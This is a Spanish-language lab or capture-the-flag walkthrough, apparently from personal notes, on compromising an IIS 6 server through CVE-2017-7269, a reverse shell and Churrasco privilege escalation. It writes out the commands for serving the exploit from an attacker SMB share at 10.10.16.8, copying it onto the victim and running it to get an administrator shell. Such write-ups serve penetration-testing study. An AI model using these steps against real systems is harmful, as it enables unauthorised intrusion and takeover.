Hacemos el escaneo con nmap:
![[Mis apuntes/ANEXOS/Pasted image 20230901161535.png]]
Vemos un servicio de IIS en su versión 6 corriendo por el puerto 80, por lo que vamos a mirar:
![[Mis apuntes/ANEXOS/Pasted image 20230901161602.png]]
Pero vamos a ver si hay exploits para explotar esta versión de IIS, donde vemos que sí con el CVE-2017-7269:
![[Mis apuntes/ANEXOS/Pasted image 20230901161949.png]]
Y ahora poniendo esto otro en google ya vemos un exploit:
![[Mis apuntes/ANEXOS/Pasted image 20230901162218.png]]
Y aquí vemos las instrucciones de cómo usar este exploit:
![[Mis apuntes/ANEXOS/Pasted image 20230901162307.png]]
Por tanto lo lanzamos siguiendo estas instrucciones:
![[Mis apuntes/ANEXOS/Pasted image 20230901162408.png]]
Y recibimos la reverse shell:
![[Mis apuntes/ANEXOS/Pasted image 20230901162420.png]]
Y ya siendo el usuario administrador del servicio de la red:
![[Mis apuntes/ANEXOS/Pasted image 20230901162437.png]]
Pero para escalar privilegios, tenemos que enumerar privilegios del sistema con el usuario que ya somos, usando el siguiente comando:
```bash
whoami/priv
```
Y vemos un privilegio que al estar habilitado nos puede servir para escalar:
![[Mis apuntes/ANEXOS/Pasted image 20230901162740.png]]
Por tanto esto es vulnerable a rotten potato, por tanto hay un exploit llamado churrasco:
```bash
https://github.com/Re4son/Churrasco/
```
![[Mis apuntes/ANEXOS/Pasted image 20230901163041.png]]
Nos lo compartimos con la máquina víctima:
```bash
impacket-smbserver recurso $(pwd) -smb2support
```
![[Mis apuntes/ANEXOS/Pasted image 20230901163240.png]]
Dentro de la máquina víctima nos ubicamos dentro del directorio temp y aquí nos bajamos el archivo:
```bash
copy \\10.10.16.8\recurso\churrasco.exe churrasco.exe
```
![[Mis apuntes/ANEXOS/Pasted image 20230901163426.png]]
Y ahora ejecutamos el siguiente comando con churrasco y ya somos el usuario administrador:
```bash
churrasco.exe -d "cmd.exe"
```
![[Mis apuntes/ANEXOS/Pasted image 20230901163511.png]]

